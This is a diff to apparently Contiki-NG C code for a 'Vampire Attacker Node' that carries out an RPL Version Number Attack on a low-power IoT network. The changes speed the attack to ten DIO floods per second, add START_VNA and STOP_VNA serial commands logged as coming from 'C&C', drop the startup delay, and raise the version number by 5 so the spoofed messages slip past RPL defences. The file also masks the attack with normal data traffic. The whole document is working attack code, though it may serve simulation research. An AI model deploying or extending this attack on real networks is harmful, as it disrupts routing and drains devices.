@@ -8,6 +8,7 @@
 #include "sys/node-id.h"
 #include "sys/log.h"
 #include "lib/random.h"
+#include "dev/serial-line.h"
 
 #define LOG_MODULE "VAMPIRE"
 #define LOG_LEVEL LOG_LEVEL_INFO
@@ -17,7 +18,7 @@
 /* Chu kỳ gửi dữ liệu bình thường */
 #define NORMAL_SEND_INTERVAL (60 * CLOCK_SECOND)
 /* Chu kỳ kích hoạt Version Number Attack */
-#define VNA_ATTACK_INTERVAL  (1 * CLOCK_SECOND)
+#define VNA_ATTACK_INTERVAL  (CLOCK_SECOND / 10)
 
 typedef struct {
   uint16_t cluster_id;
@@ -79,6 +80,8 @@ PROCESS(vampire_process, "Vampire Attacker Node");
 PROCESS(status_process, "Status reporter");
 AUTOSTART_PROCESSES(&vampire_process, &status_process);
 
+static bool is_attacking = false;
+
 PROCESS_THREAD(vampire_process, ev, data)
 {
   static struct etimer send_timer;
@@ -96,18 +99,31 @@ PROCESS_THREAD(vampire_process, ev, data)
   /* Bắt đầu chu kỳ gửi gói tin data bình thường để che giấu hành vi */
   etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
   /* Bắt đầu chu kỳ phát tán VNA */
-  /* Cho mang on dinh 5 phut roi moi bat dau tan cong de 50 node ket noi xong */
-  etimer_set(&attack_timer, 5UL * 60 * CLOCK_SECOND);
+
 
   while(1) {
     PROCESS_WAIT_EVENT();
+
+    if(ev == serial_line_event_message && data != NULL) {
+      char *msg = (char *)data;
+      if(strncmp(msg, "START_VNA", 9) == 0) {
+        LOG_INFO("Received START_VNA from C&C! Commencing Attack.\n");
+        is_attacking = true;
+        etimer_set(&attack_timer, VNA_ATTACK_INTERVAL);
+      } else if(strncmp(msg, "STOP_VNA", 8) == 0) {
+        LOG_INFO("Received STOP_VNA from C&C! Halting Attack.\n");
+        is_attacking = false;
+        etimer_stop(&attack_timer);
+      }
+    }
+
 
     /* Xử lý phát tán Version Number Attack */
     if(ev == PROCESS_EVENT_TIMER && data == &attack_timer) {
         
         /* Chỉ tấn công nếu node đã tham gia vào mạng RPL (có instance hợp lệ) */
         if(curr_instance.used) {
-            /* 1. Tăng version number lên +1 thay vì +10. Nhiều hệ thống bảo mật RPL sẽ drop gói tin nếu version nhảy vọt quá lớn. +1 giúp DIO trông có vẻ hợp lệ hơn. */
+            /* 1. Tang version number len +5. Nhieu he thong bao mat RPL se drop goi tin neu version nhay vot qua lon. +5 giup DIO trong co ve hop le hon. */
             uint8_t old_version = curr_instance.dag.version;
             curr_instance.dag.version += 5;
             
